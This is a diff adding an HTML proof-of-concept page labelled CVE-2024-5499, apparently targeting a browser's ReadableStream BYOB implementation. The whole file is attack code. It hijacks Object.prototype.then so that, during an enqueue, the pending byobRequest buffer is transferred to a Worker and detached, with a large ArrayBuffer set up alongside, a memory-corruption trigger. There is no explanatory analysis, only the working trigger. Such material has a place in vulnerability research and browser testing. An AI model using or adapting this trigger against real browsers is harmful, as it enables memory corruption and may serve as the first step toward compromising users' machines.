@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ReadableStream BYOB Test</title>
+</head>
+<body>
+  <script id="worker">
+    self.onmessage = function(event) {
+      console.log('Received buffer from main thread: ' + event.data.byteLength + ' bytes');
+    };
+  </script>
+  <script>
+    var readstream;
+    var reader;
+    var readcontroller;
+
+    alert("CVE-2024-5499");
+
+    function test() {
+      var blob = new Blob([
+        document.querySelector('#worker').textContent
+      ], { type: "text/javascript" });
+
+      var worker = new Worker(window.URL.createObjectURL(blob));
+
+      readstream = new ReadableStream({
+        type: "bytes",
+        start(c) {
+          readcontroller = c;
+          alert('ReadableStream started');
+        }
+      });
+
+      reader = readstream.getReader({ mode: "byob" });
+
+      var length = 0x42424240;
+      var ab = new ArrayBuffer(length);
+      var ba = new BigUint64Array(ab, length - 8, 1);
+
+      reader.read(new DataView(new ArrayBuffer(0x100)))
+        .then(result => {
+          alert('First read completed: ' + result.done);
+        })
+        .catch(error => {
+          alert('First read failed: ' + error);
+        });
+
+      reader.read(ba)
+        .then(result => {
+          alert('Second read completed: ' + result.done);
+        })
+        .catch(error => {
+          alert('Second read failed: ' + error);
+        });
+
+      var req;
+      var flag = false;
+      Object.defineProperty(Object.prototype, "then", {
+        get() {
+          alert("callback here");
+          if (!flag) {
+            flag = true;
+            req = readcontroller.byobRequest;
+            if (req) {
+              alert('Sending buffer to worker with size: ' + req.view.buffer.byteLength);
+              worker.postMessage(req.view.buffer, [req.view.buffer]);
+            } else {
+              alert('No byobRequest available');
+            }
+          }
+        }
+      });
+      alert('Data enqueuing');
+      readcontroller.enqueue(new DataView(new ArrayBuffer(0x101)));
+      alert('Data enqueued');
+    }
+
+    window.onload = test;
+  </script>
+</body>
+</html>
